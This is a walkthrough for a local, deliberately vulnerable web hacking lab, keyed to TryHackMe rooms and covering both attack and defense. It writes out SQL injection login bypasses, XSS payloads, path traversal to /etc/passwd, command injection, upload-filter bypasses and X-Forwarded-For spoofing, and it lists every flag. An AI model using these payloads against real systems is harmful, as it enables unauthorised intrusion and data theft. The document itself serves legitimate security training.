# HACKING LAB - Full Walkthrough (Offensive + Defensive)

## Lab Info
- URL: http://localhost:5000
- Admin: admin / admin123
- 12 Flags to find

## OFFENSIVE TRACK (Red Team)

### Task 1: Recon - Hidden Links (TryHackMe: Web Fundamentals, Content Discovery)
**Goal:** Find hidden paths

1. Check /robots.txt
   ```
   curl http://localhost:5000/robots.txt
   # Finds: /admin, /admin_backup, /hidden, /secret_notes.txt, /backup.zip, /.git/, /dev_console, /admin_panel_v2
   ```
   Flag: Visit /hidden_flag_92j3k.txt -> THM{hidden_file_found_via_robots}

2. Check /sitemap.xml
   ```
   # Finds: /api/users , /dev_console , /backup (in comment)
   ```

3. Check /secret_notes.txt
   ```
   # Dev notes with admin password, backup location, IDOR API
   ```

4. Check /.git/config
   ```
   Flag: THM{git_exposed}
   ```

5. View Source (Ctrl+U) on / and /hidden
   ```
   <!-- Hidden link: /secret_notes.txt -->
   <!-- Secret dev note: /api/users?id=1 has IDOR -->
   <!-- Flag: THM{hidden_comments_found} -->
   Invisible divs with links, black text on black bg
   ```

6. Check /backup.zip
   ```
   Flag: THM{backup_zip_found}
   ```

### Task 2: Authentication Bypass (TryHackMe: OWASP Broken Auth, SQLi)
**Goal:** Login as admin without password

- Go to /login
- Vulnerable query: SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'
- Payloads:
  - Username: `admin' --` , Password: anything
  - Username: `' OR '1'='1` , Password: `' OR '1'='1`
  - Username: `admin' OR '1'='1' --`

Defense: Use parameterized queries `cursor.execute("SELECT ... WHERE user=? AND pass=?", (user, pass))`

### Task 3: IDOR - Insecure Direct Object Reference (TryHackMe: Broken Access Control)
**Goal:** Access other users data

- /profile?id=1 -> change to ?id=2, ?id=3
  - id=1 admin -> Flag: THM{idor_profile_admin}
- /files?id=1 -> id=3 gives flag.txt -> THM{admin_flag_you_found_hidden_panel}
- /api/users?id=1 -> returns admin password, try id=2,3
  - Defense: Check `if requested_id != session_user_id: deny`

### Task 4: XSS (TryHackMe: XSS)
**Goal:** Execute JavaScript

- Reflected: /search?q=<script>alert(1)</script>
  - Try: <script>alert(document.cookie)</script>
  - Try: <img src=x onerror=alert(1)>
- Stored: /comments post payload, it executes for every visitor
- Defense: html.escape(), Content-Security-Policy header, sanitize

### Task 5: LFI & Command Injection (TryHackMe: LFI, Command Injection)
**Goal:** Read files, execute commands

- LFI: /dev_console?file=secret_notes.txt
  - Try: file=../../../../etc/passwd
  - Try: file=../../../.env or file=hidden_flag_92j3k.txt
  - Flag: THM{lfi_found_...}
  - Defense: Whitelist, block ../, use basename()

- Command Injection: /dev_console?cmd=whoami
  - Try: cmd=whoami;id
  - Try: cmd=whoami & cat /etc/passwd
  - Defense: Never use shell=True with user input, use list args

### Task 6: File Upload Bypass (TryHackMe: File Upload)
**Goal:** Upload shell

- /upload blocks .php
- Bypass: .php5, .phtml, .jpg.php, .PhP, .php%00.jpg
- Flag: THM{upload_bypass}
- Defense: Check MIME, rename file to random, store outside webroot, no exec permission

### Task 7: Admin Panel & IP Blocking
**Goal:** Access admin, then block/unblock IPs

- /admin_backup contains old creds and link to /dev_console
- /admin -> need admin role -> Flag: THM{admin_panel_accessed}, THM{dashboard_admin_access}
- /defense -> Admin can block IPs that are attacking
- Test IP blocking: Spam /login with wrong creds, your IP gets logged, admin blocks you
- Bypass IP blocking: Add header X-Forwarded-For: 8.8.8.8

## DEFENSIVE TRACK (Blue Team) - /defense

Go to http://localhost:5000/defense

### What you see:
- Blocked IPs list
- Attack logs (100 latest) with time, IP, method, path, payload
- Logs highlight SQLi (' OR), XSS (<script), LFI (../)

### Defensive Actions:
1. **Block IP:** If you see attacker IP spamming /robots.txt, /login with SQLi, block it
   - Form: IP to block -> Block
2. **Unblock IP:** If false positive
3. **Clear Logs:** After incident
4. **Secure Code Examples:** Shows how to fix each vuln

### Detection Practice:
- Look for: many 404s, /robots.txt access, /.git/, SQLi payloads, XSS payloads, LFI ../
- In real SOC, you'd use Splunk, ELK, WAF logs - this is simplified version

### TryHackMe Defense Rooms:
- OWASP Top 10 Defensive
- Burp Suite Defender
- SOC Level 1, Incident Response

## All Flags (12)

1. THM{hidden_file_found_via_robots} - /hidden_flag_92j3k.txt
2. THM{git_exposed} - /.git/config
3. THM{hidden_comments_found} - view source /hidden
4. THM{backup_found} - /admin_backup
5. THM{backup_zip_found} - /backup.zip
6. THM{dashboard_admin_access} - /dashboard as admin
7. THM{idor_profile_admin} - /profile?id=1
8. THM{admin_flag_you_found_hidden_panel} - /files?id=3
9. THM{lfi_found_...} - /dev_console?file=...
10. THM{upload_bypass} - /upload bypass
11. THM{admin_panel_accessed} - /admin
12. THM{admin_flag_you_found_hidden_panel} - admin panel flag

## Advanced Challenges

1. **Chain attacks:** Recon -> SQLi login -> IDOR to get admin -> LFI to read /etc/passwd -> Command injection to get reverse shell (simulated)
2. **Bypass IP block:** Get blocked, then bypass with X-Forwarded-For
3. **Stored XSS to admin:** Post XSS in comments, admin visits /comments, steals admin cookie (simulated)
4. **Defense evasion:** Try to attack without triggering logs (encode payloads)

## Separate from ANTAR

- ANTAR: ~/ANTAR - YouTube shorts factory, run.sh
- Hacking Lab: ~/hacking-lab - Vulnerable site, start.sh
- Completely separate zips: ANTAR_STUDIO.zip and HACKING_LAB.zip
